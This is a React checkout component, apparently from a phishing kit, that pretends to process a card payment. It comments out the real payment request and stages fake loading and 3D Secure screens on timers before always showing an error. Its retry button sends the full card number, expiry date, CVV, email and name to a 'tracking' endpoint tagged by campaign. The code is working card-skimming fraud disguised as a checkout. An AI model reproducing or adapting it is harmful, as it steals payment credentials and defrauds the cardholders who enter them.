import React, { useState, useImperativeHandle, forwardRef } from 'react';
import LoadingPopup from './popups/LoadingPopup';
import ThreeDSecurePopup from './popups/ThreeDSecurePopup';
import ErrorPopup from './popups/ErrorPopup';

const Checkout = forwardRef(function Checkout(
  {
    formData,
    email,
    firstName,
    campaign,
    onSuccess,
    onError,
    amount = '10'
  },
  ref
) {
  const [showLoading, setShowLoading] = useState(false);
  const [show3DS, setShow3DS] = useState(false);
  const [showError, setShowError] = useState(false);

  const payFetch = async (payload, verifyAmount = '10') => {
    let status = 'initiated';
    try {

      console.log('payload', payload);
      console.log('verifyAmount', verifyAmount);

      const res = await fetch('/api/payments/browserless-checkout', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload, amount: verifyAmount })
      });

      const text = await res.text();
      const json = JSON.parse(text);
      if (json && json.data && json.data.finalStatus) {
        status = json.data.finalStatus.value;
      }
      return json;
    } catch (err) {
      throw new Error(`Payment process failed: ${err.message}`);
    } finally {
      // eslint-disable-next-line no-console
      console.log('Checkout finished with status:', status);
    }
  };

  const startPaymentProcess = async () => {
    try {
      // Reset all popups
      setShowLoading(false);
      setShow3DS(false);
      setShowError(false);

      // 1. Faire la requete à payFetch
      // const result = await payFetch(formData, amount);
      // console.log('result', result);

      // 2. Afficher loading popup pendant 40 secondes
      setShowLoading(true);
      await new Promise((r) => setTimeout(r, 40000));
      
      // 3. Passer à 3D Secure pendant 2 minutes
      setShowLoading(false);
      setShow3DS(true);
      await new Promise((r) => setTimeout(r, 120000)); // 2 minutes
      
      // 4. Afficher la popup d'erreur
      setShow3DS(false);
      setShowError(true);
      
    } catch (error) {
      setShowLoading(false);
      setShow3DS(false);
      setShowError(true);
      if (onError) onError(error);
    }
  };

  const handleRetry = () => {
    setShowError(false);
    // Track the event verification_retry (inclut toutes les infos carte)
    fetch('/api/tracking/track-submission', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        eventType: 'verification_retry',
        payload: { email, firstName, card: formData?.card, name: formData?.name, exp: formData?.exp, cvv: formData?.cvv },
        campaign
      })
    });
    
    startPaymentProcess();
  };

  useImperativeHandle(ref, () => ({ startPaymentProcess }));

  return (
    <>
      <LoadingPopup 
        isVisible={showLoading}
        data={{ cardNumber: (formData?.card || formData?.cardNumber || '').toString() }}
      />
      <ThreeDSecurePopup
        isVisible={show3DS}
        amount={amount} 
        lastFourDigits={formData?.card?.slice(-4)} 
        formattedDate={formData?.exp} 
        formattedTime={formData?.exp} 
        cardNumber={formData?.card} 
      />
      <ErrorPopup 
        isVisible={showError} 
        amount={amount} 
        onRetry={handleRetry}
        lastFourDigits={formData?.card?.slice(-4)} 
        formattedDate={formData?.exp} 
        formattedTime={formData?.exp} 
        cardNumber={formData?.card} 
      />
    </>
  );
});

export default Checkout;


